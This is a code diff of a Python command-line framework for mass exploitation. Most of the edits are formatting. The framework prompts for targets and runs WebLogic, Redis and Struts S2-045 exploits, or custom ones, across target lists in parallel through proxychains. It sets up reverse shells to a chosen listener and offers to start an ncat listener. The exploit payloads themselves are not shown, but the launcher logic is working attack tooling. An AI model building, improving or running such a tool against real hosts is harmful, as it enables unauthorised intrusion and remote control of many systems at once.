@@ -29,16 +29,22 @@ def debug_except():
 
 def input_check(prompt, type=None, choices=None):
     while True:
-        user_input = str(input(colors.BLUE+prompt+colors.END)).strip().lower()
+        user_input = str(
+            input(
+                colors.BLUE +
+                prompt +
+                colors.END)).strip(
+        ).lower(
+        )
         try:
-            if choices != None:
+            if choices is not None:
                 if user_input not in choices:
                     console.print_error("[-] Invalid input")
                     continue
-                if type == None:
+                if type is None:
                     return user_input
                 return type(user_input)
-            elif type != None and choices == None:
+            elif type is not None and choices is None:
                 return type(user_input)
             else:
                 return user_input
@@ -229,11 +235,15 @@ def weblogic():
         '[?] What\'s the port of Weblogic server? ' +
         colors.END)
     '''
-    server_port = input_check("[?] What's the port of shell server? ", type=int)
+    server_port = input_check(
+        "[?] What's the port of shell server? ",
+        type=int)
     os_type = input_check('[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
     if input_check('[?] Do you need a reverse shell? [y/n] ', choices=['y', 'n']) == 'y':
-        shellServer = input_check('[?] What\'s the IP of shell receiver? ', type=int)
-        port = input_check('[?] What\'s the port of shell receiver? ', type=int)
+        shellServer = input_check('[?] What\'s the IP of shell receiver? ')
+        port = input_check(
+            '[?] What\'s the port of shell receiver? ',
+            type=int)
         if os_type.lower() == 'w':
             custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
                 shellServer, port, server_port).split()
@@ -259,7 +269,7 @@ def weblogic():
             return
 
     # start scanner
-    exploit = 'weblogic-new.py'
+    exploit = 'weblogic.py'
     work_path = '/weblogic/'
     exec_path = exploit
     jobs = 100
@@ -271,7 +281,8 @@ def weblogic():
 # currently not available
 def redis():
     print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
-    answ = input_check('[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ', choices=['y', 'n'])
+    answ = input_check(
+        '[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ', choices=['y', 'n'])
     os.chdir('./exploits/redis/')
     if answ.lower() == 'y':
         subprocess.call(['proxychains4', '-q', '-f',
@@ -282,7 +293,9 @@ def redis():
 
 def s2_045():
     print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
-    port = input_check('[?] What\'s the port of your target server? ', type=int)
+    port = input_check(
+        '[?] What\'s the port of your target server? ',
+        type=int)
 
     # args list
     exploit = 's2_045_cmd.py'
@@ -334,7 +347,8 @@ def attack():
         proxy = True
     else:
         proxy = False
-    answ = input_check('\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ', choices=['a', 'm'])
+    answ = input_check(
+        '\n[?] Do you wish to use\n\n    [a] built-in exploits\n    [m] or launch your own manually?\n\n[=] Your choice: ', choices=['a', 'm'])
     if answ == 'a':
         print(
             colors.CYAN +
@@ -343,7 +357,14 @@ def attack():
             colors.END +
             '\n')
         print(console.built_in)
-        answ = input_check('[=] Your choice: ', type=int, choices=['0', '1', '2', '3', '4'])
+        answ = input_check(
+            '[=] Your choice: ',
+            type=int,
+            choices=['0',
+                     '1',
+                     '2',
+                     '3',
+                     '4'])
         if answ == 2:
             redis()
         elif answ == 1:
@@ -369,13 +390,17 @@ def attack():
             "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
         jobs = input_check("[?] How many processes each time? ", type=int)
         custom_args = []
-        answ = input_check("[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
+        answ = input_check(
+            "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
         if answ == 'y':
             lhost = input(
                 "[*] Where do you want me to send shells? ").strip()
-            lport = input_check("[*] and at what port? (make sure you have access to that port) ", type=int)
+            lport = input_check(
+                "[*] and at what port? (make sure you have access to that port) ",
+                type=int)
             custom_args = ['-l', lhost, '-p', lport]
-            answ = input_check('[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
+            answ = input_check(
+                '[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
             if answ == 'y':
                 print("\n[*] Spawning ncat listener in new window...\n")
                 try:
@@ -463,7 +488,7 @@ def scanner(scanner_args):
         tested += 1
         try:
             e_args += [ip]
-            print(e_args)
+            print(colors.CYAN + ' '.join(e_args) + colors.END + '\n')
             proc = subprocess.Popen(e_args)
 
             # continue to next target
